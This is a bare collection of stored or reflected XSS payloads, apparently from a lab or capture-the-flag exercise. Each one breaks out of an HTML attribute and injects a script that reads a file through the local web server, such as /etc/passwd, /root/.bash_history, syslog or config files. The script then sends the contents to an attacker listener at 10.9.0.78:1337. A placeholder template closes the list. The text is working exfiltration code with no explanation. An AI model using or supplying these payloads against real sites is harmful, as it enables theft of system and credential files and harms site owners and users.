


'><script>
  fetch('http://127.0.0.1/etc/passwd')
    .then(response => response.text())
    .then(data => {
      fetch('http://10.9.0.78:1337/?passwd=' + encodeURIComponent(data));
    });
</script>


'><script>
  fetch('http://127.0.0.1/var/www/html/index.html')
    .then(response => response.text())
    .then(data => {
      fetch('http://10.9.0.78:1337/?index=' + encodeURIComponent(data));
    });
</script>



'><script>
  fetch('http://127.0.0.1/root/.bash_history')
    .then(response => response.text())
    .then(data => {
      fetch('http://10.9.0.78:1337/?bash_history=' + encodeURIComponent(data));
    });
</script>

'><script>
  fetch('http://127.0.0.1/var/log/syslog')
    .then(response => response.text())
    .then(data => {
      fetch('http://10.9.0.78:1337/?syslog=' + encodeURIComponent(data));
    });
</script>

'><script>
  fetch('http://127.0.0.1/var/www/html/')
    .then(response => response.text())
    .then(data => {
      fetch('http://10.9.0.78:1337/var/www/html' + encodeURIComponent(data));
    });
</script>


'><script>
  fetch('http://127.0.0.1/home/user/important_file.txt')
    .then(response => response.text())
    .then(data => {
      fetch('http://10.9.0.78:1337/?important_file=' + encodeURIComponent(data));
    });
</script>



'><script>
  fetch('http://127.0.0.1/tmp/sensitive_data')
    .then(response => response.text())
    .then(data => {
      fetch('http://10.9.0.78:1337/?sensitive_data=' + encodeURIComponent(data));
    });
</script>


'><script>
  fetch('http://127.0.0.1/opt/config/settings.conf')
    .then(response => response.text())
    .then(data => {
      fetch('http://10.9.0.78:1337/?settings=' + encodeURIComponent(data));
    });
</script>


'><script>
  fetch('http://127.0.0.1/proc/cpuinfo')
    .then(response => response.text())
    .then(data => {
      fetch('http://10.9.0.78:1337/?cpuinfo=' + encodeURIComponent(data));
    });
</script>



'><script>
  fetch('http://127.0.0.1/dev/null')
    .then(response => response.text())
    .then(data => {
      fetch('http://10.9.0.78:1337/?dev_null=' + encodeURIComponent(data));
    });
</script>



```javascript
fetch('http://127.0.0.1/<PATH FOR YOUR ARCHIVE>');
```
